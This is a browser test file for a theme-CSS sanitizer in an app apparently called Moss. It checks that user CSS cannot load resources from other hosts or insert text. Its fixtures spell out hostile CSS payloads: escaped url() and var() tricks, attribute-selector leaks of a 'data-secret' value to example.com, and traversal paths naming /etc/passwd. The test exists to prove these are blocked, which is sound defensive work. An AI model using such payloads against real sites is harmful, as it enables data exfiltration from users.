// FILE: themeCss.browser.ts
// Purpose: Theme CSS cannot make the browser load a file from another host, and cannot write
//          text, while its safe rules still apply. A stored theme picture loads only from
//          Moss's own theme image route.
// Layer: Web browser test (real Chromium CSS parser, network requests watched by Playwright)
// Origin: extends apps/web/src/themeCss.browser.test.ts from T3 Code
//   (https://github.com/pingdotgg/t3code, MIT) at 1d1489d0b8 with a request probe and Moss's
//   extra rules.

import { afterEach, describe, expect, it } from "vitest";
import { commands } from "vitest/browser";

import { applyThemeCss } from "~/theme/themeCss";

declare module "vitest/internal/browser" {
  interface BrowserCommands {
    beginAppThumbnailRequestProbe: (appTitle?: string, readonlyHost?: boolean) => Promise<void>;
    endAppThumbnailRequestProbe: () => Promise<
      { resourceType: string; local: boolean; appFrame: boolean }[]
    >;
    setServiceWorkerBypass: (bypass: boolean) => Promise<void>;
  }
}

const SAFE_DATA_IMAGE =
  "data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%224%22 height=%224%22%3E%3Crect width=%224%22 height=%224%22 fill=%22%23abc%22/%3E%3C/svg%3E";

function mountProbe(attribute: string, tag = "div"): HTMLElement {
  const element = document.createElement(tag);
  element.setAttribute(attribute, "");
  element.textContent = "probe";
  element.style.width = "40px";
  element.style.height = "40px";
  document.body.append(element);
  return element;
}

/** Give the browser time to start any fetch a style asked for: style, layout, paint. */
async function settle(): Promise<void> {
  for (let frame = 0; frame < 3; frame += 1) {
    await new Promise((resolve) => requestAnimationFrame(() => resolve(undefined)));
  }
  await new Promise((resolve) => setTimeout(resolve, 1500));
}

function keptCssText(): string {
  return document.adoptedStyleSheets
    .flatMap((sheet) => Array.from(sheet.cssRules, (rule) => rule.cssText))
    .join("\n");
}

const HOSTILE_THEME_CSS = String.raw`
  @import url(https://example.com/sheet.css);
  @namespace svg url(http://www.w3.org/2000/svg);
  @property --registered { syntax: "<url>"; inherits: false; initial-value: url(https://example.com/d); }
  @counter-style leak { system: cyclic; symbols: url(https://example.com/f); }
  @font-face { font-family: "Leak Font"; src: url(https://example.com/font.woff2); }
  @keyframes leak { to { background-image: url(https://example.com/g); } }
  :root { --leak: u\72l(https://example.com/a); --label: "Another product"; }
  [data-theme-css-probe] {
    color: rgb(1, 2, 3);
    background-image: u\72l(https://example.com/b);
    list-style-image: var(--leak);
    border-image-source: var(--registered);
    mask-image: v\61r(--none, u\72l(https://example.com/e));
    font-family: "Leak Font", sans-serif;
    animation: leak 10s infinite;
    @media (min-width: 0px) { cursor: url(https://example.com/c), auto; }
    & span { background-image: url(https://example.com/nested); }
  }
  [data-theme-css-probe-set] { background-image: im\61ge-set("https://example.com/h" 1x); }
  [data-theme-css-probe-padded] { background-image: url("\a0 data:/../../probe-padded"); }
  @supports (display: block) { [data-theme-css-probe-groups] { background-image: url(https://example.com/supports); } }
  @layer theme { [data-theme-css-probe-groups] { border-image-source: url(https://example.com/layer); } }
  @container (min-width: 0px) { [data-theme-css-probe-groups] { list-style-image: url(https://example.com/container); } }
  @scope ([data-theme-css-probe-groups]) { :scope { mask-image: url(https://example.com/scope); } }
  [data-theme-css-probe]::before { content: "Another product"; }
  [data-theme-css-probe]::after { content: var(--label); }
  [data-theme-css-probe-safe] { background-image: url("${SAFE_DATA_IMAGE}"); outline-color: rgb(4, 5, 6); }
  [data-theme-css-probe-safe]::after { content: ""; display: block; width: 4px; height: 4px; }
`;

describe("theme CSS guard", () => {
  afterEach(() => {
    applyThemeCss(undefined);
  });

  it("drops every rule that would load a remote file or write text, and keeps the rest", async () => {
    const probe = mountProbe("data-theme-css-probe");
    probe.append(document.createElement("span"));
    const imageSet = mountProbe("data-theme-css-probe-set");
    const padded = mountProbe("data-theme-css-probe-padded");
    const groups = mountProbe("data-theme-css-probe-groups", "li");
    const safe = mountProbe("data-theme-css-probe-safe");
    // The control: one remote load outside the guard, which the probe must see in the same
    // window. Without it, "no requests" could mean the page had not fetched anything yet.
    const canary = mountProbe("data-theme-css-canary");
    const canaryStyle = document.createElement("style");
    canaryStyle.textContent =
      "[data-theme-css-canary] { background-image: url(https://example.org/canary.png); }";
    try {
      // A mock service worker left by an earlier test file would handle these loads itself,
      // where the probe cannot see them.
      await commands.setServiceWorkerBypass(true);
      await commands.beginAppThumbnailRequestProbe("no app frame");
      document.head.append(canaryStyle);
      void getComputedStyle(canary).backgroundImage;
      const result = applyThemeCss(HOSTILE_THEME_CSS);
      const style = getComputedStyle(probe);
      // Touch every property that could start a load, then let the page paint.
      void [
        style.backgroundImage,
        style.listStyleImage,
        style.borderImageSource,
        style.maskImage,
        style.cursor,
        getComputedStyle(probe.querySelector("span")!).backgroundImage,
        getComputedStyle(imageSet).backgroundImage,
        getComputedStyle(padded).backgroundImage,
        getComputedStyle(groups).backgroundImage,
      ];
      await settle();
      const requests = await commands.endAppThumbnailRequestProbe();

      // Only the canary reached another host.
      expect(requests.filter((request) => !request.local)).toEqual([
        { resourceType: "image", local: false, appFrame: false },
      ]);
      expect(keptCssText()).not.toContain("example.com");
      expect(keptCssText()).not.toContain("/../../");
      // A custom property may hold a string, but no text property is left to show one.
      expect(keptCssText()).not.toMatch(/(?:content|quotes):[^;]*Another product/);
      expect(result.droppedDeclarations).toBeGreaterThan(0);
      expect(result.droppedRules).toBeGreaterThan(0);

      expect(style.color).toBe("rgb(1, 2, 3)");
      expect(style.backgroundImage).toBe("none");
      expect(style.listStyleImage).toBe("none");
      expect(style.borderImageSource).toBe("none");
      expect(style.maskImage).toBe("none");
      expect(style.cursor).toBe("auto");
      expect(getComputedStyle(imageSet).backgroundImage).toBe("none");
      expect(getComputedStyle(padded).backgroundImage).toBe("none");
      expect(getComputedStyle(groups).backgroundImage).toBe("none");
      expect(getComputedStyle(groups).borderImageSource).toBe("none");
      expect(getComputedStyle(groups).listStyleImage).toBe("none");
      expect(getComputedStyle(groups).maskImage).toBe("none");
      expect(["none", "normal"]).toContain(getComputedStyle(probe, "::before").content);
      expect(["none", "normal"]).toContain(getComputedStyle(probe, "::after").content);

      // The safe rules in the same sheet still apply: data: images and decorative content.
      expect(getComputedStyle(safe).backgroundImage).toContain("data:image/svg+xml");
      expect(getComputedStyle(safe).outlineColor).toBe("rgb(4, 5, 6)");
      expect(getComputedStyle(safe, "::after").content).toBe('""');
    } finally {
      await commands.endAppThumbnailRequestProbe();
      await commands.setServiceWorkerBypass(false);
      canaryStyle.remove();
      for (const element of [probe, imageSet, padded, groups, safe, canary]) element.remove();
    }
  });

  it("removes the CSS again", () => {
    const probe = mountProbe("data-theme-css-probe");
    try {
      applyThemeCss("[data-theme-css-probe] { color: rgb(7, 8, 9); }");
      expect(getComputedStyle(probe).color).toBe("rgb(7, 8, 9)");
      applyThemeCss(undefined);
      expect(getComputedStyle(probe).color).not.toBe("rgb(7, 8, 9)");
      expect(keptCssText()).not.toContain("data-theme-css-probe");
    } finally {
      probe.remove();
    }
  });
});

// A stored theme picture: 64 lower-case hex and a type. Only this shape may load, and only from
// Moss's own theme image route; the guard writes that address itself.
const PICTURE_A = `${"0123456789abcdef".repeat(4)}.png`;
const PICTURE_B = `${"fedcba9876543210".repeat(4)}.webp`;

const PICTURE_THEME_CSS = String.raw`
  :root { --picture: url(moss-theme-image:${PICTURE_B}); }
  [data-theme-picture-plain] { background-image: url(moss-theme-image:${PICTURE_A}); }
  [data-theme-picture-quoted] { background: url( "moss-theme-image:${PICTURE_B}" ) right bottom / auto 50% no-repeat !important; }
  [data-theme-picture-var] { background-image: var(--picture); }
  [data-theme-picture-escaped] { background-image: url(moss-theme-image\3a ${PICTURE_A}); }
  [data-theme-picture-escaped-scheme] { background-image: u\72l(moss-theme-image:${PICTURE_A}); }
  [data-theme-picture-host] { background-image: url(moss-theme-image://example.com/${PICTURE_A}); }
  [data-theme-picture-traversal] { background-image: url(moss-theme-image:../../api/local-image?path=/etc/passwd); }
  [data-theme-picture-query] { background-image: url(moss-theme-image:${PICTURE_A}?path=/etc/passwd); }
  [data-theme-picture-upper] { background-image: url(moss-theme-image:${PICTURE_A.toUpperCase()}); }
  [data-theme-picture-svg] { background-image: url(moss-theme-image:${PICTURE_A.replace(".png", ".svg")}); }
  [data-theme-picture-pair] { background-image: url(moss-theme-image:${PICTURE_A}), url(https://example.com/pair); }
  [data-theme-picture-set] { background-image: image-set(url(moss-theme-image:${PICTURE_A}) 1x); }
  [data-theme-picture-attr][data-secret^="a"] { background-image: url(moss-theme-image:${PICTURE_A}); }
  [data-theme-picture-attr][data-secret^="b"] { background-image: url(moss-theme-image:${PICTURE_B}); }
  [data-theme-picture-attr][data-secret^="c"] { background-image: url(https://example.com/leak-c); }
`;

describe("theme CSS guard with stored pictures", () => {
  afterEach(() => {
    applyThemeCss(undefined);
  });

  it("loads a stored picture only from Moss's own theme image route, and nothing else", async () => {
    const names = [
      "plain",
      "quoted",
      "var",
      "escaped",
      "escaped-scheme",
      "host",
      "traversal",
      "query",
      "upper",
      "svg",
      "pair",
      "set",
      "attr",
    ];
    const probes = Object.fromEntries(
      names.map((name) => [name, mountProbe(`data-theme-picture-${name}`)]),
    );
    probes.attr!.setAttribute("data-secret", "b-value");
    const canary = mountProbe("data-theme-css-canary");
    const canaryStyle = document.createElement("style");
    canaryStyle.textContent =
      "[data-theme-css-canary] { background-image: url(https://example.org/canary-pictures.png); }";
    const ownRoute = `${window.location.origin}/api/theme-images/`;
    try {
      await commands.setServiceWorkerBypass(true);
      await commands.beginAppThumbnailRequestProbe("no app frame");
      performance.clearResourceTimings();
      document.head.append(canaryStyle);
      void getComputedStyle(canary).backgroundImage;
      applyThemeCss(PICTURE_THEME_CSS);
      for (const probe of Object.values(probes)) void getComputedStyle(probe).backgroundImage;
      await settle();
      const requests = await commands.endAppThumbnailRequestProbe();

      // Only the canary reached another host.
      expect(requests.filter((request) => !request.local)).toEqual([
        { resourceType: "image", local: false, appFrame: false },
      ]);
      // Every picture load is the theme image route with an id of the fixed shape, nothing more.
      const pictureLoads = performance
        .getEntriesByType("resource")
        .map((entry) => entry.name)
        .filter((name) => name.includes("theme-image"));
      expect(pictureLoads.length).toBeGreaterThan(0);
      for (const name of pictureLoads) {
        expect(name).toMatch(
          /^https?:\/\/[^/]+\/api\/theme-images\/[0-9a-f]{64}\.(?:png|jpg|webp|gif|avif)$/,
        );
        expect(name.startsWith(ownRoute)).toBe(true);
      }
      expect(keptCssText()).not.toContain("moss-theme-image:");
      expect(keptCssText()).not.toContain("example.com");
      expect(keptCssText()).not.toContain("passwd");

      const background = (name: string) => getComputedStyle(probes[name]!).backgroundImage;
      expect(background("plain")).toBe(`url("${ownRoute}${PICTURE_A}")`);
      expect(background("quoted")).toBe(`url("${ownRoute}${PICTURE_B}")`);
      // var() in a property that takes an address is dropped: the guard cannot see its end.
      expect(background("var")).toBe("none");
      // Choosing a picture by what an attribute holds still only reaches Moss's own route.
      expect(background("attr")).toBe(`url("${ownRoute}${PICTURE_B}")`);
      // The browser decodes escapes before the guard reads a value, so an escaped reference is
      // the same fixed-shape reference: it can only reach the same route, or nothing.
      for (const name of ["escaped", "escaped-scheme"]) {
        expect(["none", `url("${ownRoute}${PICTURE_A}")`], name).toContain(background(name));
      }
      for (const name of ["host", "traversal", "query", "upper", "svg", "pair", "set"]) {
        expect(background(name), name).toBe("none");
      }
    } finally {
      await commands.endAppThumbnailRequestProbe();
      await commands.setServiceWorkerBypass(false);
      canaryStyle.remove();
      canary.remove();
      for (const probe of Object.values(probes)) probe.remove();
    }
  });
});

// Values the browser finishes after the guard has read them: var(), env() and attr(). Reported
// 2026-11-17 by the lead: `background: var(--z) url(…)` read "" per longhand and loaded.
const LATE_RESOLVED_THEME_CSS = String.raw`
  :root { --z: ; --x: url(https://example.com/v12); }
  @property --reg { syntax: "<image>"; inherits: false; initial-value: url(https://example.com/v13); }
  [data-late="v1"][data-secret^="a"] { background: var(--z) url(https://example.com/v1) no-repeat; }
  [data-late="v2"] { background-image: var(--app-avatar); }
  [data-late="v3"] { border: 4px solid; border-image: var(--z) url(https://example.com/v3) 30; }
  [data-late="v4"] { mask: var(--z) url(https://example.com/v4); }
  [data-late="v5"] { display: list-item; list-style: var(--z) url(https://example.com/v5) inside; }
  [data-late="v6"] { display: list-item; list-style: var(--z) "WRITTEN TEXT" inside; }
  [data-late="v7"] { cursor: var(--z) url(https://example.com/v7), auto; }
  [data-late="v8"]::before { content: var(--z) url(https://example.com/v8); }
  [data-late="v8"]::after { content: var(--z) "WRITTEN TEXT"; }
  [data-late="v9"] { filter: var(--z) url(https://example.com/v9#f); }
  [data-late="v10"] { clip-path: var(--z) url(https://example.com/v10#c); }
  [data-late="v11"] { offset-path: var(--z) url(https://example.com/v11#p); }
  [data-late="v12"] { background-image: var(--x); }
  [data-late="v13"] { background-image: var(--reg); }
  [data-late="v14"] { background-image: image("https://example.com/v14"); }
  [data-late="v15"] { background-image: cross-fade(url(https://example.com/v15) 50%, url(data:image/png;base64,AAAA)); }
  [data-late="v16"] { & span { background: var(--z) url(https://example.com/v16); } }
  @container (min-width: 0px) { [data-late="v17"] { background: var(--z) url(https://example.com/v17); } }
  @scope ([data-late="v18"]) { :scope { background: var(--z) url(https://example.com/v18); } }
  @starting-style { [data-late="v19"] { background: var(--z) url(https://example.com/v19); } }
  [data-late="v20"] { background: var(--z) u\72l(https://example.com/v20); }
  [data-late="v21"] { background: env(--none, url(https://example.com/v21)); }
  [data-late="v22"] { background-image: attr(data-src type(<url>)); }
  [data-late="v23"] { hyphenate-character: "WRITTEN"; text-emphasis: "W"; }
  [data-late="v24"] { shape-outside: var(--z) url(https://example.com/v24); float: left; }
  [data-late="safe"] { color: var(--late-color); background-color: var(--late-color); border: 2px solid var(--late-color); }
`;

const LATE_CASES = Array.from({ length: 24 }, (_, index) => `v${index + 1}`);

describe("theme CSS guard with late-resolved values", () => {
  afterEach(() => {
    applyThemeCss(undefined);
  });

  it("no var(), env() or attr() lets a rule load from another host or write text", async () => {
    const probes = Object.fromEntries(
      [...LATE_CASES, "safe"].map((name) => {
        const element = mountProbe("data-late");
        element.setAttribute("data-late", name);
        element.setAttribute("data-secret", "a-secret");
        element.setAttribute("data-src", "https://example.com/v22");
        element.append(document.createElement("span"));
        return [name, element];
      }),
    );
    // A custom property the app itself sets inline, holding another host's address: a theme
    // must not be able to load it on a selector of its choice.
    probes.v2!.style.setProperty("--app-avatar", "url(https://example.com/v2)");
    probes.safe!.style.setProperty("--late-color", "rgb(10, 20, 30)");
    const canary = mountProbe("data-theme-css-canary");
    const canaryStyle = document.createElement("style");
    canaryStyle.textContent =
      "[data-theme-css-canary] { background-image: url(https://example.org/canary-late.png); }";
    try {
      await commands.setServiceWorkerBypass(true);
      await commands.beginAppThumbnailRequestProbe("no app frame");
      document.head.append(canaryStyle);
      void getComputedStyle(canary).backgroundImage;
      const result = applyThemeCss(LATE_RESOLVED_THEME_CSS);
      for (const probe of Object.values(probes)) {
        const style = getComputedStyle(probe);
        void [
          style.backgroundImage,
          style.borderImageSource,
          style.maskImage,
          style.listStyleImage,
          style.cursor,
          style.filter,
          style.clipPath,
          style.offsetPath,
          style.shapeOutside,
          getComputedStyle(probe, "::before").content,
          getComputedStyle(probe.querySelector("span")!).backgroundImage,
        ];
      }
      await settle();
      const requests = await commands.endAppThumbnailRequestProbe();

      // Only the canary reached another host.
      expect(requests.filter((request) => !request.local)).toEqual([
        { resourceType: "image", local: false, appFrame: false },
      ]);
      expect(keptCssText()).not.toContain("example.com");
      expect(keptCssText()).not.toContain("WRITTEN");
      expect(result.droppedDeclarations).toBeGreaterThanOrEqual(LATE_CASES.length);

      const style = (name: string) => getComputedStyle(probes[name]!);
      expect(style("v1").backgroundImage).toBe("none");
      expect(style("v2").backgroundImage).toBe("none");
      expect(style("v3").borderImageSource).toBe("none");
      expect(style("v4").maskImage).toBe("none");
      expect(style("v5").listStyleImage).toBe("none");
      expect(style("v6").listStyleType).not.toContain("WRITTEN");
      expect(style("v7").cursor).toBe("auto");
      expect(["none", "normal"]).toContain(getComputedStyle(probes.v8!, "::before").content);
      expect(["none", "normal"]).toContain(getComputedStyle(probes.v8!, "::after").content);
      expect(style("v9").filter).toBe("none");
      expect(style("v10").clipPath).toBe("none");
      expect(style("v11").offsetPath).toBe("none");
      for (const name of ["v12", "v13", "v14", "v15", "v17", "v18", "v19", "v20", "v21", "v22"]) {
        expect(style(name).backgroundImage, name).toBe("none");
      }
      expect(getComputedStyle(probes.v16!.querySelector("span")!).backgroundImage).toBe("none");
      expect(style("v23").hyphenateCharacter).not.toContain("WRITTEN");
      expect(style("v23").textEmphasisStyle).not.toContain("W");
      expect(style("v24").shapeOutside).toBe("none");

      // var() still works where no address or text can go: colours, borders.
      expect(style("safe").color).toBe("rgb(10, 20, 30)");
      expect(style("safe").backgroundColor).toBe("rgb(10, 20, 30)");
      expect(style("safe").borderTopColor).toBe("rgb(10, 20, 30)");
    } finally {
      await commands.endAppThumbnailRequestProbe();
      await commands.setServiceWorkerBypass(false);
      canaryStyle.remove();
      canary.remove();
      for (const probe of Object.values(probes)) probe.remove();
    }
  });
});
